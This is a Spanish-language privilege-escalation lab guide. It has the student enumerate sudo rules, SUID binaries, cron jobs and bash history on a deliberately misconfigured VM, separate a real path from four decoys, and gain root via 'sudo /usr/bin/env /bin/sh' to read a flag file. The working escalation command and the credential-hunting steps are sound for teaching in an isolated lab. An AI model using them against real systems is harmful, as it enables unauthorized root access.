# Laboratorio: análisis y priorización de hallazgos

[Inicio](../../../README.md) | [Privilege Escalation](../../README.md) | [Capítulo 07](../README.md)

> [!CAUTION]
> El escenario contiene una regla de `sudo` insegura de forma intencional. Ejecuta este laboratorio solo dentro de una máquina virtual aislada, sin conexión directa a Internet y con una instantánea limpia creada antes de empezar. Los valores del escenario son ficticios y no deben reutilizarse fuera del laboratorio.

## Alcance

Este laboratorio presenta un sistema con una ruta de escalada real y cuatro señuelos. El objetivo es enumerar todos los hallazgos, clasificar cada uno como explotable, señuelo o ruido, justificar la clasificación y ejecutar únicamente la ruta priorizada hasta confirmar el privilegio de `root`. No se persigue acumular técnicas, sino decidir con evidencia.

## Requisitos

- VM Ubuntu Server 22.04 LTS o superior en red host-only.
- Instantánea limpia previa al laboratorio.
- Cuenta sin privilegios administrativos llamada `student`.
- Acceso a `sudo`, `cron`, `find` y `getcap`.
- Autorización expresa sobre el sistema.

## Preparación

Desde la carpeta de este laboratorio, ejecuta el aprovisionamiento con privilegios administrativos:

```bash
sudo bash setup.sh
```

El script es idempotente: puede ejecutarse varias veces sin duplicar configuraciones. Al terminar imprime un resumen de los hallazgos creados.

## Pasos

Todos los pasos siguientes se ejecutan como el usuario `student`, no como `root`.

### 1. Enumerar los privilegios delegados

```bash
sudo -l
```

Anota la regla que autoriza `/usr/bin/env` sin contraseña y con destino `root`.

### 2. Enumerar binarios SUID y capabilities

```bash
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
```

Confirma si algún resultado aporta una ruta nueva o si se trata de binarios legítimos del sistema.

### 3. Revisar las tareas programadas

```bash
ls -la /etc/cron.d /etc/cron.daily /etc/cron.hourly 2>/dev/null
cat /etc/cron.d/privesc-lab 2>/dev/null
systemctl list-timers --all 2>/dev/null
```

Observa que la entrada de cron invoca `/opt/tools/locked.sh` y que ningún temporizador de `systemd` consume `/opt/tools/cleanup.sh`.

### 4. Inspeccionar el directorio de herramientas

```bash
ls -la /opt/tools
cat /opt/tools/notes.env
cat /opt/tools/cleanup.sh
ls -la /opt/tools/locked.sh
```

Registra permisos y propietario de cada archivo antes de sacar conclusiones.

### 5. Revisar el historial de la cuenta

```bash
cat /home/student/.bash_history
```

Anota la contraseña antigua encontrada y recuerda que su presencia no demuestra que siga siendo válida.

### 6. Clasificar cada hallazgo

Con la evidencia recogida, asigna a cada hallazgo un tipo: **explotable**, **señuelo** o **ruido**. Un señuelo es un hallazgo que aparenta ser una ruta pero no conduce a mayor privilegio; el ruido es una observación sin relación con la escalada y sin valor para decidir.

### 7. Justificar la clasificación

Comprueba cada descarte con un argumento técnico:

```bash
grep -R "cleanup.sh" /etc/cron* /etc/systemd 2>/dev/null
cat /etc/cron.d/privesc-lab 2>/dev/null
```

Si el script `cleanup.sh` no aparece en ningún consumidor privilegiado, su permiso `0777` no constituye una ruta. Si `locked.sh` es propiedad de `root` y no escribible, la entrada de cron no puede alterarse.

Intenta confirmar el descarte del script protegido:

```bash
echo "# tentativa" >> /opt/tools/locked.sh
```

El sistema debe responder con permiso denegado, lo que confirma que la ruta no es explotable.

### 8. Priorizar y ejecutar únicamente la ruta real

La regla de `sudo` sobre `/usr/bin/env` es la única ruta que concede privilegio de `root` con alta fiabilidad y bajo ruido. Ejecuta solo esa ruta:

```bash
sudo /usr/bin/env /bin/sh
```

### 9. Confirmar el privilegio alcanzado

Dentro de la shell obtenida:

```bash
id
```

El resultado debe mostrar `uid=0(root)`.

### 10. Leer la prueba de objetivo

```bash
cat /root/flag.txt
```

### 11. Producir la tabla resumen

Elabora una tabla con la evidencia de tu análisis:

| Hallazgo | Tipo | Por qué |
|---|---|---|
| Regla `sudo` sobre `/usr/bin/env` | Explotable | `NOPASSWD` sobre un binario que ejecuta comandos arbitrarios permite lanzar una shell como `root`. |
| `/opt/tools/cleanup.sh` con `0777` | Señuelo | Escribible, pero ningún `cron` ni timer lo consume. |
| `/opt/tools/notes.env` | Señuelo | Contiene un token ficticio que no concede acceso al sistema. |
| Contraseña en `.bash_history` | Señuelo | No es válida en el sistema y no autentica contra ninguna cuenta. |
| Cron sobre `/opt/tools/locked.sh` | Señuelo | El script pertenece a `root` y no es escribible; no puede modificarse. |

## Resultados esperados

- La enumeración identifica una ruta real y cuatro señuelos.
- Los señuelos se descartan con argumentos verificables, no por intuición.
- La ruta priorizada se ejecuta en último lugar, después de clasificar.
- La shell obtenida reporta `uid=0(root)`.
- `/root/flag.txt` se lee únicamente tras confirmar el privilegio.

## Validación

Señales técnicas de éxito:

```text
[ ] sudo -l muestra la regla NOPASSWD sobre /usr/bin/env
[ ] cleanup.sh no aparece en ningún consumidor privilegiado
[ ] locked.sh no es escribible por student (permiso denegado)
[ ] la contraseña del historial no autentica en el sistema
[ ] id dentro de la shell reporta uid=0(root)
[ ] /root/flag.txt devuelve el valor de laboratorio
[ ] la tabla resumen clasifica los cinco hallazgos
```

## Limpieza

Elimina la configuración del laboratorio y la prueba de objetivo:

```bash
sudo rm -f /etc/sudoers.d/privesc-lab /root/flag.txt
sudo rm -rf /opt/tools
sudo rm -f /etc/cron.d/privesc-lab
```

Como alternativa, revierte la instantánea limpia de la máquina virtual para restaurar el estado original.

---

[Volver al capítulo 07](../README.md) | [Volver a Privilege Escalation](../../README.md) | [Inicio](../../../README.md)
